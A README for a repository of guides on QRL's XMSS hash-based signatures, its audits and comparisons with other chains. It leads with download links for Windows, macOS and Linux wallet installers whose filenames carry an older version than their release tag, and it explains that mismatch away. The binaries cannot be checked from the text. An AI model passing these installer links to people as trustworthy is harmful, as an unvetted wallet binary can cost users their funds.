![QRL signatures and comparisons](assets/banner-hub.png)

<h1 align="center">QRL signatures and comparisons</h1>

<p align="center">How XMSS hash-based signatures work, what the audits covered, where the network layer is still classical, and how QRL compares with the chains and devices named beside it.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-A85A00?style=for-the-badge&labelColor=0B0E14" alt="MIT licence"> <img src="https://img.shields.io/badge/RELEASE-v1.9.3-A85A00?style=for-the-badge&labelColor=0B0E14" alt="Current release v1.9.3"></p>

## Downloads - v1.9.3

<p align="center"><a href="https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-win.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-A85A00?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=white&labelColor=0B0E14" alt="Download QRL Wallet for Windows"></a> <a href="https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-darwin.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-A85A00?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0E14" alt="Download QRL Wallet for macOS"></a> <a href="https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-linux.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-A85A00?style=for-the-badge&logo=linux&logoColor=white&labelColor=0B0E14" alt="Download QRL Wallet for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-A85A00?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=white&labelColor=0B0E14" alt="Windows"> | A single `.exe` installer; the project documents no minimum Windows version for this tag | [`QRL-Desktop-Wallet-v1.9.2-win.exe`](https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-win.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-A85A00?style=flat-square&logo=apple&logoColor=white&labelColor=0B0E14" alt="macOS"> | A single `.dmg` disk image; the project documents no minimum macOS version for this tag | [`QRL-Desktop-Wallet-v1.9.2-darwin.dmg`](https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-darwin.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-A85A00?style=flat-square&logo=linux&logoColor=white&labelColor=0B0E14" alt="Linux"> | One `.zip` holding a `.deb` and a `.pacman` package; no minimum distribution version is documented | [`QRL-Desktop-Wallet-v1.9.2-linux.zip`](https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-linux.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/qrl-wallet/qrl-desktop-wallet/releases/tag/v1.9.3). The asset filenames still carry the previous version string; the files themselves are the ones attached to v1.9.3.

> Only download from this GitHub release page.

## What this repository is for

This repository explains the part of QRL that is hardest to check from the outside: the signature scheme. Every QRL transaction is authorised by an XMSS signature, a hash-based scheme with a finite number of one-time keys under each address. The first ten guides here build that picture from the hash function upward, then state what the audits did and did not cover, and where the network layer is still classical.

The remaining nine guides do comparisons. Not the marketing version, where every project claims to be quantum ready, but the checkable one: what scheme signs a transaction on a given chain today, when it entered the signing path, and who reviewed the implementation. That is why most of the comparison pages end with the same answer in different words: the chain still signs with elliptic curves, and a research announcement is not a shipped signing path.

What this repository deliberately does not do is repeat the wallet material or the market material. Installation, backups and repair belong to the wallet repository, and supply, price and identity belong to the facts repository. Both are linked at the bottom of this page, and neither is summarised here.

## Who it is for

- **Readers from a security background** who want the construction rather than the conclusion.
- **Holders deciding how much weight to put on the word quantum resistant**, for this project and for others.
- **Anyone comparing chains** who needs the signature scheme rather than a roadmap image.
- **Users of a hardware wallet** who want to know what the device actually signs with.

## Start here

<div align="center">

| Guide | Why start there |
| --- | --- |
| [How XMSS Signatures Work](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/how-qrl-xmss-signatures-work.md) | This guide builds the tree, the one-time keys and the signature from the hash function upward. |
| [What Is a Hash-Based Signature?](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/what-is-a-qrl-hash-based-signature.md) | This page explains what the scheme rests on, and why a quantum computer changes the threat so little. |
| [QRL Security Audit History](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/qrl-security-audit-history.md) | This guide names the firms, the years and the scope, and says what an audit does not prove. |
| [Quantum Resistant Cryptocurrency: The List](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/quantum-resistant-cryptocurrency-list-with-qrl.md) | This page separates live post-quantum signing from research, announcements and marketing claims. |

</div>

## How to use these guides

1. Start with the scheme, because every comparison later in the repository assumes it.
2. Read the audit page before the comparison pages, so a claim and its evidence stay together.
3. When a page names another chain, check the scheme it signs with today rather than the roadmap.
4. Keep the wallet's mechanics separate, since key handling is a software question rather than a cryptographic one.
5. Treat any date, version or audit finding as a snapshot of the day it was read.
6. Use the last page as the checklist, because it turns the whole set into four questions you can ask any project.

## The guides, grouped

### How the signatures work (10 guides)

<div align="center">

| Guide | What it answers |
| --- | --- |
| [How XMSS Signatures Work](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/how-qrl-xmss-signatures-work.md) | This guide builds a Merkle tree of one-time keys and shows what a spend actually reveals. |
| [What Is a Hash-Based Signature?](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/what-is-a-qrl-hash-based-signature.md) | This page explains why security resting on a hash function changes the quantum threat entirely. |
| [Why QRL Uses a Merkle Tree](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/why-qrl-uses-a-merkle-tree.md) | This guide explains how one published root lets many one-time keys share a single address. |
| [LMS vs XMSS Signature Schemes](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/lms-vs-qrl-xmss-signatures.md) | This page compares two hash-based schemes standardised together, on construction rather than on claims. |
| [QRL Security Audit History](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/qrl-security-audit-history.md) | This guide names the reviewing firms and years, the scope of each review and its limits. |
| [Is the QRL P2P Layer Quantum Safe?](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/is-qrl-p2p-layer-quantum-safe.md) | This page states that signing is post-quantum while the peer-to-peer key exchange is still classical. |
| [Is QRL Wallet Safe to Use?](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/is-qrl-wallet-safe-to-use.md) | This guide separates what the software does well from the risks that belong to the person using it. |
| [QRL Wallet Source Code and Licence](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/qrl-wallet-source-code-licence.md) | This page explains what the MIT licence permits and why a permission is not a security guarantee. |
| [Can Quantum Computers Break Bitcoin?](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/can-quantum-computers-break-bitcoin-and-qrl.md) | This guide explains which keys a quantum computer could attack and why hash-based signatures sit outside that set. |
| [Why Stateful Signatures Matter in QRL](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/why-stateful-signatures-matter-in-qrl.md) | This page explains why each key is used once and why the index belongs in your backup. |

</div>

### How QRL compares (9 guides)

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Quantum Resistant Cryptocurrency: The List](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/quantum-resistant-cryptocurrency-list-with-qrl.md) | This guide builds the list from what signs a transaction today rather than from what a project plans. |
| [Is XRP Quantum Resistant?](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/is-xrp-quantum-resistant-like-qrl.md) | This page checks the XRP Ledger's signing scheme and finds classical elliptic-curve keys in use. |
| [Is Cardano Quantum Proof?](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/is-cardano-quantum-proof-like-qrl.md) | This guide checks Cardano's Ed25519 signatures and separates research discussion from a shipped scheme. |
| [Is Ethereum Quantum Resistant?](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/ethereum-quantum-resistance-and-qrl.md) | This page covers ECDSA on the account layer and BLS in consensus, both classical today. |
| [QRL vs Trezor on Quantum Readiness](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/qrl-vs-trezor-quantum-readiness.md) | This guide separates offline key storage from post-quantum signing, which the device does not provide. |
| [What Makes a Wallet Quantum Safe?](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/what-makes-qrl-wallet-quantum-safe.md) | This page sets the test: which scheme signs, where keys live and who handles the index. |
| [Are Quantum Wallets Expensive?](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/are-qrl-wallets-expensive.md) | This guide breaks the cost into the software, the machine, the hardware device and the network fee. |
| [What Reddit Says About QRL](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/what-reddit-says-about-qrl.md) | This page explains what community threads are good for and where a comment stops being evidence. |
| [How QRL Compares on Quantum Readiness](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/how-qrl-compares-on-quantum-readiness.md) | This guide turns the whole set into four questions that can be asked of any project. |

</div>

## What each guide changes

<div align="center">

| Task | Guide | What is different afterwards |
| --- | --- | --- |
| Understand what signs a QRL transaction | How XMSS Signatures Work | You can describe the tree, the one-time key and the path that proves it. |
| Explain the quantum claim to somebody else | What Is a Hash-Based Signature? | You can say what would have to break, and why that is not factoring. |
| Weigh an audit as evidence | QRL Security Audit History | You know who reviewed what, in which year, and what the review did not cover. |
| Compare a chain without repeating a slogan | Is Ethereum Quantum Resistant? | You know the scheme that signs today and whether any post-quantum scheme is live. |
| Judge a hardware wallet's claim | QRL vs Trezor on Quantum Readiness | You can separate keeping keys offline from signing a transaction with post-quantum keys. |
| Keep an address signing | Why Stateful Signatures Matter in QRL | You understand why the key index is part of the backup and why reuse is fatal. |

</div>

## Common first questions

### Is QRL quantum proof, or just quantum resistant?

The distinction is honest language. QRL's signatures rest on hash functions rather than on elliptic curves, so the problem a quantum computer is expected to solve does not apply to them. That is a statement about the scheme, not a promise about every part of the system.

### Do the audits prove the wallet is safe?

No. They are reviews by named firms in 2018 and 2026, and they reduce a category of risk. The risks that remain belong to the machine, the download and the person holding the phrase.

### Why is the network layer not post-quantum?

Because the peer-to-peer key exchange is still classical, and post-quantum key establishment is in development without a published date. Signing and transport are separate problems, and only the first is solved today.

### Does a quantum computer break Bitcoin tomorrow?

No. The relevant attack needs a machine far larger than anything built, against a public key that has been exposed. The useful reading is preparation rather than a date.

### Can I check any of this myself?

Yes. The source is public and MIT-licensed, the audit reports are published by the firms that wrote them, and every comparison page states which scheme a chain signs with today so the claim can be verified independently.

## Before you install

Read the wallet's [verification guide](https://github.com/qrl-wallet/wallet-setup-and-repair/blob/main/verify-the-qrl-installer.md) before you run any build, and keep the phrase offline. Verification and custody are the two habits that decide whether the cryptography matters.

## About

QRL has signed with XMSS since the network launched in 2018. These pages are written from the published specifications, the audit reports and the projects' own documentation, and they name a version only where the release page does.

## License

MIT. The wallet's licence text lives in its repository; the guides here are documentation.

---

What QRL is and what its market data means are in [token-facts-and-prices](https://github.com/qrl-wallet/token-facts-and-prices). Installing, backing up and repairing the wallet are in [wallet-setup-and-repair](https://github.com/qrl-wallet/wallet-setup-and-repair).
